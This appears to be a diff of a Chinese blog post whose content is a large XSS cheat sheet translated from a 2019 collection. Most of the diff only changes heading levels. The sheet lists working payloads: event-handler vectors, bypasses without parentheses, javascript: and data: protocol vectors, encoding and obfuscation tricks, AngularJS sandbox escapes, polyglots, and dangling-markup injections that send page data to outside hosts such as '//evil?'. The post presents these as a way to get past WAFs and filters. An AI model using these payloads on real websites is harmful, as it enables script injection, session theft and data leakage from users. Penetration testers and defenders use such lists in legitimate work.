+data</code></pre><h3 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h3><p><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200403143705.png" alt></p>
+<h3 id="备忘录"><a href="#备忘录" class="headerlink" title="备忘录"></a>备忘录</h3><p>收藏一下，当字典用</p>
 <hr>
 <p>这是一份跨站脚本（XSS）备忘录，收集了大量的XSS攻击向量，包含了各种事件处理、通讯协议、特殊属性、限制字符、编码方式、沙箱逃逸等技巧，可以帮助渗透测试人员绕过WAF和过滤机制。<br>网址：<a href="https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&mid=2448904601&idx=1&sn=3c8fd18363ddb3b7b6b5f33565696186&chksm=8b55c1c4bc2248d2c2b935b3980652ce576f4d532e63ca4c72f9a7a4cbafb2c9e6a62abca620&mpshare=1&scene=1&srcid=&sharer_sharetime=1576462865354&sharer_shareid=9aaf420661f2f9968b23fa8064773d63#rd" target="_blank" rel="noopener">跨站脚本（XSS）备忘录-2019版</a></p>
 <hr>
-<h3 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h3><h4 id="不需要用户交互的事件处理程序"><a href="#不需要用户交互的事件处理程序" class="headerlink" title="不需要用户交互的事件处理程序"></a>不需要用户交互的事件处理程序</h4><p>激活元素时触发(IE)</p>
+<h4 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h4><h5 id="不需要用户交互的事件处理程序"><a href="#不需要用户交互的事件处理程序" class="headerlink" title="不需要用户交互的事件处理程序"></a>不需要用户交互的事件处理程序</h5><p>激活元素时触发(IE)</p>
 <pre><code>&lt;a id=x tabindex=1 onactivate=alert(1)&gt;&lt;/a&gt;</code></pre><p>页面打印后触发（Chrome、Firefox、IE)</p>
 <pre><code>&lt;body onafterprint=alert(1)&gt;</code></pre><p>CSS动画取消时触发(Firefox)</p>
 <pre><code>&lt;style&gt;@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}&lt;/style&gt;&lt;a id=x style=&quot;position:absolute;&quot; onanimationcancel=&quot;alert(1)&quot;&gt;&lt;/a&gt;</code></pre><p>CSS动画结束时触发（Chrome、Firefox、IE、Safari)</p>
@@ -771,7 +771,7 @@ data</code></pre><h2 id="思维导图"><a href="#思维导图" class="headerlink
 <pre><code>&lt;style&gt;:target {color:red;}&lt;/style&gt;&lt;a id=x style=&quot;transition:color 1s&quot; ontransitionend=alert(1)&gt;&lt;/a&gt;</code></pre><p>CSS过渡开始时触发（Firefox)</p>
 <pre><code>&lt;style&gt;:target {transform: rotate(180deg);}&lt;/style&gt;&lt;a id=x style=&quot;transition:transform 2s&quot; ontransitionrun=alert(1)&gt;&lt;/a&gt;</code></pre><p>未履行承诺时触发（Firefox)</p>
 <pre><code>&lt;body onunhandledrejection=alert(1)&gt;&lt;script&gt;fetch(&#39;//xyz&#39;)&lt;/script&gt;</code></pre><p>等待数据时触发（IE）</p>
-<pre><code>&lt;video autoplay controls onwaiting=alert(1)&gt;&lt;source src=&quot;validvideo.mp4&quot; type=video/mp4&gt;&lt;/video&gt;</code></pre><h4 id="需要用户交互的事件处理程序"><a href="#需要用户交互的事件处理程序" class="headerlink" title="需要用户交互的事件处理程序"></a>需要用户交互的事件处理程序</h4><p>右键单击或使用鼠标中键时触发（Chrome、Firefox)</p>
+<pre><code>&lt;video autoplay controls onwaiting=alert(1)&gt;&lt;source src=&quot;validvideo.mp4&quot; type=video/mp4&gt;&lt;/video&gt;</code></pre><h5 id="需要用户交互的事件处理程序"><a href="#需要用户交互的事件处理程序" class="headerlink" title="需要用户交互的事件处理程序"></a>需要用户交互的事件处理程序</h5><p>右键单击或使用鼠标中键时触发（Chrome、Firefox)</p>
 <pre><code>&lt;input onauxclick=alert(1)&gt;</code></pre><p>需要复制一段文字（Chrome、Firefox、IE、Safari)</p>
 <pre><code>&lt;a onbeforecopy=&quot;alert(1)&quot; contenteditable&gt;test&lt;/a&gt;</code></pre><p>要求剪切一段文字（Chrome、Firefox、IE、Safari)</p>
 <pre><code>&lt;a onbeforecut=&quot;alert(1)&quot; contenteditable&gt;test&lt;/a&gt;</code></pre><p>需要粘贴一段文字（IE）</p>
@@ -811,7 +811,7 @@ data</code></pre><h2 id="思维导图"><a href="#思维导图" class="headerlink
 <pre><code>&lt;form onsubmit=alert(1)&gt;&lt;input type=submit&gt;</code></pre><p>需要在页面上的任意位置单击并重新加载（Chrome)</p>
 <pre><code>&lt;svg onunload=window.open(&#39;javascript:alert(1)&#39;)&gt;</code></pre><p>需要调节音量（Chrome、Firefox、IE、Safari)</p>
 <pre><code>&lt;audio autoplay controls onvolumechange=alert(1)&gt;&lt;source src=&quot;validaudio.wav&quot; type=&quot;audio/wav&quot;&gt;&lt;/audio&gt;</code></pre><p>使用鼠标滚轮时触发（Chrome、Firefox、IE、Safari)</p>
-<pre><code>&lt;body onwheel=alert(1)&gt;</code></pre><h3 id="限制字符"><a href="#限制字符" class="headerlink" title="限制字符"></a>限制字符</h3><p>无括号，使用异常处理</p>
+<pre><code>&lt;body onwheel=alert(1)&gt;</code></pre><h4 id="限制字符"><a href="#限制字符" class="headerlink" title="限制字符"></a>限制字符</h4><p>无括号，使用异常处理</p>
 <pre><code>&lt;script&gt;onerror=alert;throw 1&lt;/script&gt;</code></pre><p>无括号，无分号，使用异常处理</p>
 <pre><code>&lt;script&gt;{onerror=alert}throw 1&lt;/script&gt;</code></pre><p>无括号的异常处理，没有使用表达式的半冒号</p>
 <pre><code>&lt;script&gt;throw onerror=alert,1&lt;/script&gt;</code></pre><p>无括号异常处理和evil</p>
@@ -821,9 +821,9 @@ data</code></pre><h2 id="思维导图"><a href="#思维导图" class="headerlink
 <pre><code>&lt;script&gt;&#39;alert\x281\x29&#39;instanceof{[Symbol[&#39;hasInstance&#39;]]:eval}&lt;/script&gt;</code></pre><p>无括号，使用位置重定向</p>
 <pre><code>&lt;script&gt;location=&#39;javascript:alert\x281\x29&#39;&lt;/script&gt;</code></pre><p>无字符串，使用位置没有括号重定向</p>
 <pre><code>&lt;script&gt;location=name&lt;/script&gt;</code></pre><p>无括号，使用模板字符串</p>
-<pre><code>&lt;script&gt;alert`1`&lt;/script&gt;</code></pre><h3 id="前端框架"><a href="#前端框架" class="headerlink" title="前端框架"></a>前端框架</h3><p>Bootstrap onanimationstart事件</p>
+<pre><code>&lt;script&gt;alert`1`&lt;/script&gt;</code></pre><h4 id="前端框架"><a href="#前端框架" class="headerlink" title="前端框架"></a>前端框架</h4><p>Bootstrap onanimationstart事件</p>
 <pre><code>&lt;xss class=progress-bar-animated onanimationstart=alert(1)&gt;</code></pre><p>Bootstrap ontransitionend事件</p>
-<pre><code>&lt;xss class=&quot;carousel slide&quot; data-ride=carousel data-interval=100 ontransitionend=alert(1)&gt;&lt;xss class=carousel-inner&gt;&lt;xss class=&quot;carousel-item active&quot;&gt;&lt;/xss&gt;&lt;xss class=carousel-item&gt;&lt;/xss&gt;&lt;/xss&gt;&lt;/xss&gt;</code></pre><h3 id="通讯协议"><a href="#通讯协议" class="headerlink" title="通讯协议"></a>通讯协议</h3><p>iframe src属性JavaScript协议</p>
+<pre><code>&lt;xss class=&quot;carousel slide&quot; data-ride=carousel data-interval=100 ontransitionend=alert(1)&gt;&lt;xss class=carousel-inner&gt;&lt;xss class=&quot;carousel-item active&quot;&gt;&lt;/xss&gt;&lt;xss class=carousel-item&gt;&lt;/xss&gt;&lt;/xss&gt;&lt;/xss&gt;</code></pre><h4 id="通讯协议"><a href="#通讯协议" class="headerlink" title="通讯协议"></a>通讯协议</h4><p>iframe src属性JavaScript协议</p>
 <pre><code>&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;</code></pre><p>具有JavaScript协议的对象data属性</p>
 <pre><code>&lt;object data=&quot;javascript:alert(1)&quot;&gt;</code></pre><p>使用JavaScript协议嵌入src属性</p>
 <pre><code>&lt;embed src=&quot;javascript:alert(1)&quot;&gt;</code></pre><p>标准的JavaScript协议</p>
@@ -847,14 +847,14 @@ data</code></pre><h2 id="思维导图"><a href="#思维导图" class="headerlink
 <pre><code>&lt;form action=javascript:alert(1)&gt;&lt;input type=submit value=XSS&gt;</code></pre><p>Isindex和formaction</p>
 <pre><code>&lt;isindex type=submit formaction=javascript:alert(1)&gt;</code></pre><p>index和action</p>
 <pre><code>&lt;isindex type=submit action=javascript:alert(1)&gt;</code></pre><p>将元素与外部网址一起使用</p>
-<pre><code>&lt;svg&gt;&lt;use href=&quot;//subdomain1.portswigger-labs.net/use_element/upload.php#x&quot; /&gt;&lt;/svg&gt;</code></pre><h3 id="其他有用的属性"><a href="#其他有用的属性" class="headerlink" title="其他有用的属性"></a>其他有用的属性</h3><p>使用srcdoc属性</p>
+<pre><code>&lt;svg&gt;&lt;use href=&quot;//subdomain1.portswigger-labs.net/use_element/upload.php#x&quot; /&gt;&lt;/svg&gt;</code></pre><h4 id="其他有用的属性"><a href="#其他有用的属性" class="headerlink" title="其他有用的属性"></a>其他有用的属性</h4><p>使用srcdoc属性</p>
 <pre><code>&lt;iframe srcdoc=&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;&gt;&lt;/iframe&gt;</code></pre><p>对实体使用srcdoc</p>
 <pre><code>&lt;iframe srcdoc=&quot;&amp;lt;img src=1 onerror=alert(1)&amp;gt;&quot;&gt;&lt;/iframe&gt;</code></pre><p>在页面上的任何位置（甚至在表单外部）单击提交元素</p>
 <pre><code>&lt;form action=&quot;javascript:alert(1)&quot;&gt;&lt;input type=submit id=x&gt;&lt;/form&gt;&lt;label for=x&gt;XSS&lt;/label&gt;</code></pre><p>隐藏的输入：访问键属性可以在通常无法利用的元素上启用XSS</p>
 <pre><code>&lt;input type=&quot;hidden&quot; accesskey=&quot;X&quot; onclick=&quot;alert(1)&quot;&gt; (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)</code></pre><p>链接元素：访问键属性可以在通常无法利用的元素上启用XSS</p>
 <pre><code>&lt;link rel=&quot;canonical&quot; accesskey=&quot;X&quot; onclick=&quot;alert(1)&quot; /&gt; (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)</code></pre><p>下载属性可以保存当前网页的副本</p>
 <pre><code>&lt;a href=# download=&quot;filename.html&quot;&gt;Test&lt;/a&gt;</code></pre><p>使用Referrerpolicy禁用引荐来源网址</p>
-<pre><code>&lt;img referrerpolicy=&quot;no-referrer&quot; src=&quot;//portswigger-labs.net&quot;&gt;</code></pre><h3 id="特殊标签"><a href="#特殊标签" class="headerlink" title="特殊标签"></a>特殊标签</h3><p>重定向到其他域</p>
+<pre><code>&lt;img referrerpolicy=&quot;no-referrer&quot; src=&quot;//portswigger-labs.net&quot;&gt;</code></pre><h4 id="特殊标签"><a href="#特殊标签" class="headerlink" title="特殊标签"></a>特殊标签</h4><p>重定向到其他域</p>
 <pre><code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=//portswigger-labs.net&quot;&gt;</code></pre><p>元字符集属性UTF-7</p>
 <pre><code>&lt;meta charset=&quot;UTF-7&quot; /&gt; +ADw-script+AD4-alert(1)+ADw-/script+AD4-</code></pre><p>元字符集UTF-7</p>
 <pre><code>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-7&quot; /&gt; +ADw-script+AD4-alert(1)+ADw-/script+AD4-</code></pre><p>UTF-7 BOM字符（必须在文档开头）1</p>
@@ -868,7 +868,7 @@ data</code></pre><h2 id="思维导图"><a href="#思维导图" class="headerlink
 +ADw-script+AD4-alert(1)+ADw-/script+AD4-</code></pre><p>升级不安全的请求</p>
 <pre><code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;upgrade-insecure-requests&quot;&gt;</code></pre><p>通过iframe沙箱禁用JavaScript</p>
 <pre><code>&lt;iframe sandbox src=&quot;//portswigger-labs.net&quot;&gt;&lt;/iframe&gt;</code></pre><p>禁用引荐来源</p>
-<pre><code>&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;</code></pre><h3 id="编码方式"><a href="#编码方式" class="headerlink" title="编码方式"></a>编码方式</h3><p>超长UTF-8</p>
+<pre><code>&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;</code></pre><h4 id="编码方式"><a href="#编码方式" class="headerlink" title="编码方式"></a>编码方式</h4><p>超长UTF-8</p>
 <pre><code>%C0%BCscript&gt;alert(1)&lt;/script&gt;
 %E0%80%BCscript&gt;alert(1)&lt;/script&gt;
 %F0%80%80%BCscript&gt;alert(1)&lt;/script&gt;
@@ -899,12 +899,12 @@ avascript:alert(1)&quot;&gt;XSS&lt;/a&gt;
 &lt;a href=&quot;java&amp;NewLine;script:alert(1)&quot;&gt;XSS&lt;/a&gt;
 &lt;a href=&quot;javascript&amp;colon;alert&amp;lpar;1&amp;rpar;&quot;&gt;XSS&lt;/a&gt;</code></pre><p>网址编码</p>
 <pre><code>&lt;a href=&quot;javascript:x=&#39;%27-alert(1)-%27&#39;;&quot;&gt;XSS&lt;/a&gt;</code></pre><p>HTML实体和URL编码</p>
-<pre><code>&lt;a href=&quot;javascript:x=&#39;&amp;percnt;27-alert(1)-%27&#39;;&quot;&gt;XSS&lt;/a&gt;</code></pre><h3 id="混淆"><a href="#混淆" class="headerlink" title="混淆"></a>混淆</h3><p>Firefox在＆之后允许NULL</p>
+<pre><code>&lt;a href=&quot;javascript:x=&#39;&amp;percnt;27-alert(1)-%27&#39;;&quot;&gt;XSS&lt;/a&gt;</code></pre><h4 id="混淆"><a href="#混淆" class="headerlink" title="混淆"></a>混淆</h4><p>Firefox在＆之后允许NULL</p>
 <pre><code>&lt;a href=&quot;javascript&amp;#x6a;avascript:alert(1)&quot;&gt;Firefox&lt;/a&gt;</code></pre><p>Firefox允许在命名实体内使用NULL</p>
 <pre><code>&lt;a href=&quot;javascript&amp;colon;alert(1)&quot;&gt;Firefox&lt;/a&gt;</code></pre><p>Firefox在开头的注释中允许使用NULL字符</p>
 <pre><code>&lt;!-- &gt;&lt;img title=&quot;--&gt;&lt;iframe/onload=alert(1)&gt;&quot;&gt; --&gt;
 &lt;!-- &gt;&lt;img title=&quot;--&gt;&lt;iframe/onload=alert(1)&gt;&quot;&gt; --&gt;</code></pre><p>带有base64的脚本src中的数据协议</p>
-<pre><code>&lt;script src=data:text/javascript;base64,YWxlcnQoMSk=&gt;&lt;/script&gt;</code></pre><h3 id="客户端模板注入"><a href="#客户端模板注入" class="headerlink" title="客户端模板注入"></a>客户端模板注入</h3><h4 id="AngularJS沙箱逃逸"><a href="#AngularJS沙箱逃逸" class="headerlink" title="AngularJS沙箱逃逸"></a>AngularJS沙箱逃逸</h4><p>版本：1.0.1-1.1.5</p>
+<pre><code>&lt;script src=data:text/javascript;base64,YWxlcnQoMSk=&gt;&lt;/script&gt;</code></pre><h4 id="客户端模板注入"><a href="#客户端模板注入" class="headerlink" title="客户端模板注入"></a>客户端模板注入</h4><h5 id="AngularJS沙箱逃逸"><a href="#AngularJS沙箱逃逸" class="headerlink" title="AngularJS沙箱逃逸"></a>AngularJS沙箱逃逸</h5><p>版本：1.0.1-1.1.5</p>
 <pre><code>{{constructor.constructor('alert(1)')()}}</code></pre><p>版本：1.0.1-1.1.5（较短）</p>
 <pre><code>{{$on.constructor('alert(1)')()}}</code></pre><p>版本：1.2.0-1.2.1</p>
 <pre><code>{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}</code></pre><p>版本：1.2.2-1.2.5</p>
@@ -946,11 +946,11 @@ m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
 $eval('a(b.c)');[].push.apply=a;
 }}</code></pre><p>版本：&gt; = 1.6.0</p>
 <pre><code>{{constructor.constructor('alert(1)')()}}</code></pre><p>版本：&gt; = 1.6.0（较短）</p>
-<pre><code>{{$on.constructor('alert(1)')()}}</code></pre><h4 id="基于DOM的AngularJS沙箱逃逸"><a href="#基于DOM的AngularJS沙箱逃逸" class="headerlink" title="基于DOM的AngularJS沙箱逃逸"></a>基于DOM的AngularJS沙箱逃逸</h4><p>所有版本（Chrome）</p>
+<pre><code>{{$on.constructor('alert(1)')()}}</code></pre><h5 id="基于DOM的AngularJS沙箱逃逸"><a href="#基于DOM的AngularJS沙箱逃逸" class="headerlink" title="基于DOM的AngularJS沙箱逃逸"></a>基于DOM的AngularJS沙箱逃逸</h5><p>所有版本（Chrome）</p>
 <pre><code>&lt;input autofocus ng-focus=&quot;$event.path|orderBy:&#39;[].constructor.from([1],alert)&#39;&quot;&gt;</code></pre><p>所有版本（Chrome）较短</p>
 <pre><code>&lt;input id=x ng-focus=$event.path|orderBy:&#39;(z=alert)(1)&#39;&gt;</code></pre><p>所有版本（所有浏览器）都较短</p>
 <pre><code>&lt;input autofocus ng-focus=&quot;$event.composedPath()|orderBy:&#39;[].constructor.from([1],alert)&#39;&quot;&gt;</code></pre><p>版本：1.2.0-1.5.0</p>
-<pre><code>&lt;div ng-app ng-csp&gt;&lt;div ng-focus=&quot;x=$event;&quot; id=f tabindex=0&gt;foo&lt;/div&gt;&lt;div ng-repeat=&quot;(key, value) in x.view&quot;&gt;&lt;div ng-if=&quot;key == &#39;window&#39;&quot;&gt;{{ [1].reduce(value.alert, 1); }}&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</code></pre><h3 id="无脚本攻击"><a href="#无脚本攻击" class="headerlink" title="无脚本攻击"></a>无脚本攻击</h3><p>背景属性</p>
+<pre><code>&lt;div ng-app ng-csp&gt;&lt;div ng-focus=&quot;x=$event;&quot; id=f tabindex=0&gt;foo&lt;/div&gt;&lt;div ng-repeat=&quot;(key, value) in x.view&quot;&gt;&lt;div ng-if=&quot;key == &#39;window&#39;&quot;&gt;{{ [1].reduce(value.alert, 1); }}&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</code></pre><h4 id="无脚本攻击"><a href="#无脚本攻击" class="headerlink" title="无脚本攻击"></a>无脚本攻击</h4><p>背景属性</p>
 <pre><code>&lt;body background=&quot;//evil?
 &lt;table background=&quot;//evil?
 &lt;table&gt;&lt;thead background=&quot;//evil?
@@ -983,10 +983,10 @@ $eval('a(b.c)');[].push.apply=a;
 <pre><code>&lt;embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=&quot;</code></pre><p>使用iframe窗口名称从页面传递数据</p>
 <pre><code>&lt;iframe src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=&quot;</code></pre><p>使用object窗口名称从页面传递数据</p>
 <pre><code>&lt;object data=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=&quot;</code></pre><p>使用frameset窗口名称从页面传递数据</p>
-<pre><code>&lt;frameset&gt;&lt;frame src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=&quot;</code></pre><h3 id="多语言有效载荷"><a href="#多语言有效载荷" class="headerlink" title="多语言有效载荷"></a>多语言有效载荷</h3><p>多语言有效载荷1</p>
+<pre><code>&lt;frameset&gt;&lt;frame src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=&quot;</code></pre><h4 id="多语言有效载荷"><a href="#多语言有效载荷" class="headerlink" title="多语言有效载荷"></a>多语言有效载荷</h4><p>多语言有效载荷1</p>
 <pre><code>javascript:/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;&lt;svg/onload=&#39;+/&quot;/+/onmouseover=1/+/[*/[]/+alert(1)//&#39;&gt;</code></pre><p>多语言有效载荷2</p>
 <pre><code>javascript:&quot;/*&#39;/*`/*--&gt;&lt;/noscript&gt;&lt;/title&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/template&gt;&lt;/noembed&gt;&lt;/script&gt;&lt;html \&quot;
- onmouseover=/*&amp;lt;svg/*/onload=alert()//&gt;</code></pre><h3 id="经典向量（XSS加密）"><a href="#经典向量（XSS加密）" class="headerlink" title="经典向量（XSS加密）"></a>经典向量（XSS加密）</h3><p>具有JavaScript协议的Image src</p>
+ onmouseover=/*&amp;lt;svg/*/onload=alert()//&gt;</code></pre><h4 id="经典向量（XSS加密）"><a href="#经典向量（XSS加密）" class="headerlink" title="经典向量（XSS加密）"></a>经典向量（XSS加密）</h4><p>具有JavaScript协议的Image src</p>
 <pre><code>&lt;img src=&quot;javascript:alert(1)&quot;&gt;</code></pre><p>带有JavaScript协议的正文背景</p>
 <pre><code>&lt;body background=&quot;javascript:alert(1)&quot;&gt;</code></pre><p>随着现代浏览器使用空来源，iframe数据网址不再起作用</p>
 <pre><code>&lt;iframe src=&quot;data:text/html,&lt;img src=1 onerror=alert(document.domain)&gt;&quot;&gt;</code></pre><p>用于IE的VBScript协议</p>
@@ -1043,7 +1043,7 @@ function/*&lt;img src=1 onerror=alert(1)&gt;*/document.body.innerHTML(){}
 function document.body.innerHTML(){ x = &quot;&lt;img src=1 onerror=alert(1)&gt;&quot;; }
 &lt;/script&gt;
 &lt;/body&gt;</code></pre><p>GreyMagic HTML + time漏洞利用（即使在5 docmode下也不再起作用）</p>
-<pre><code>&lt;HTML&gt;&lt;BODY&gt;&lt;?xml:namespace prefix=&quot;t&quot; ns=&quot;urn:schemas-microsoft-com:time&quot;&gt;&lt;?import namespace=&quot;t&quot; implementation=&quot;#default#time2&quot;&gt;&lt;t:set attributeName=&quot;innerHTML&quot; to=&quot;XSS&lt;img src=1 onerror=alert(1)&gt;&quot;&gt; &lt;/BODY&gt;&lt;/HTML&gt;</code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://xz.aliyun.com/t/4067#toc-27" target="_blank" rel="noopener">https://xz.aliyun.com/t/4067#toc-27</a><br><a href="https://juejin.im/post/5bac9e21f265da0afe62ec1b" target="_blank" rel="noopener">https://juejin.im/post/5bac9e21f265da0afe62ec1b</a><br><a href="https://zhuanlan.zhihu.com/p/61773197" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/61773197</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&amp;mid=2448904601&amp;idx=1&amp;sn=3c8fd18363ddb3b7b6b5f33565696186&amp;chksm=8b55c1c4bc2248d2c2b935b3980652ce576f4d532e63ca4c72f9a7a4cbafb2c9e6a62abca620&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1576462865354&amp;sharer_shareid=9aaf420661f2f9968b23fa8064773d63#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&amp;mid=2448904601&amp;idx=1&amp;sn=3c8fd18363ddb3b7b6b5f33565696186&amp;chksm=8b55c1c4bc2248d2c2b935b3980652ce576f4d532e63ca4c72f9a7a4cbafb2c9e6a62abca620&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1576462865354&amp;sharer_shareid=9aaf420661f2f9968b23fa8064773d63#rd</a><br><a href="https://www.leavesongs.com/PENETRATION/xss-collect.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/xss-collect.html</a></p>
+<pre><code>&lt;HTML&gt;&lt;BODY&gt;&lt;?xml:namespace prefix=&quot;t&quot; ns=&quot;urn:schemas-microsoft-com:time&quot;&gt;&lt;?import namespace=&quot;t&quot; implementation=&quot;#default#time2&quot;&gt;&lt;t:set attributeName=&quot;innerHTML&quot; to=&quot;XSS&lt;img src=1 onerror=alert(1)&gt;&quot;&gt; &lt;/BODY&gt;&lt;/HTML&gt;</code></pre><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/t/4067#toc-27" target="_blank" rel="noopener">https://xz.aliyun.com/t/4067#toc-27</a><br><a href="https://juejin.im/post/5bac9e21f265da0afe62ec1b" target="_blank" rel="noopener">https://juejin.im/post/5bac9e21f265da0afe62ec1b</a><br><a href="https://zhuanlan.zhihu.com/p/61773197" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/61773197</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&amp;mid=2448904601&amp;idx=1&amp;sn=3c8fd18363ddb3b7b6b5f33565696186&amp;chksm=8b55c1c4bc2248d2c2b935b3980652ce576f4d532e63ca4c72f9a7a4cbafb2c9e6a62abca620&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1576462865354&amp;sharer_shareid=9aaf420661f2f9968b23fa8064773d63#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&amp;mid=2448904601&amp;idx=1&amp;sn=3c8fd18363ddb3b7b6b5f33565696186&amp;chksm=8b55c1c4bc2248d2c2b935b3980652ce576f4d532e63ca4c72f9a7a4cbafb2c9e6a62abca620&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1576462865354&amp;sharer_shareid=9aaf420661f2f9968b23fa8064773d63#rd</a><br><a href="https://www.leavesongs.com/PENETRATION/xss-collect.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/xss-collect.html</a></p>
 <hr>
 <p>版权声明：</p>
 <p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p>
